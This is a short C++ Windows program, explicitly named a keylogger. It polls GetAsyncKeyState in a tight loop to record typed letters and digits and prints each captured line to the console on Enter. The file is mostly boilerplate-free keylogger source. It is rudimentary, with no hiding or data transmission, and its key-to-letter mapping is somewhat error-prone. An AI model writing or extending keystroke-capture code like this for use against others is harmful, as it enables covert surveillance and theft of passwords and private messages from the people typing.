// KeyLogger.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
#include <Windows.h>
#include <iostream>
#include <cstdlib>
using namespace std;



bool isNum(DWORD value) {
	if (value >= 0x30 && value <= 0x39)
		return true;
	return false;
}
string currentSentence = "";
void findLetterTyped() {

	char alphabet[26] = { 'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z' };
	char numbers[10] = { '0', '1', '2', '3', '4', '5', '6', '7', '8', '9' };

	DWORD word = 0x30;
	for (int i = 0; i < 43; i++) {
		if ((GetAsyncKeyState(word) & 1)) { //Loops through every single letter until it finds the one with the least bit number changed 

			if (isNum(word)) {
				currentSentence += numbers[i];
			}else if (GetAsyncKeyState(VK_SHIFT)) { //Deals with Uppercase letters

				currentSentence+=toupper(alphabet[abs(42 - i - 26 + 1)]);
			}
			else {
				currentSentence += alphabet[abs(42-i-26+1)];
			}
			
		}

		word++;
		if (GetAsyncKeyState(VK_RETURN) & 1) {
			cout << currentSentence << endl;
			currentSentence = "";
			return;
		}
	}

}


int main()
{
	while (1) {
		Sleep(1);
		findLetterTyped();
	}
}

// Run program: Ctrl + F5 or Debug > Start Without Debugging menu
// Debug program: F5 or Debug > Start Debugging menu

// Tips for Getting Started: 
//   1. Use the Solution Explorer window to add/manage files
//   2. Use the Team Explorer window to connect to source control
//   3. Use the Output window to see build output and other messages
//   4. Use the Error List window to view errors
//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file
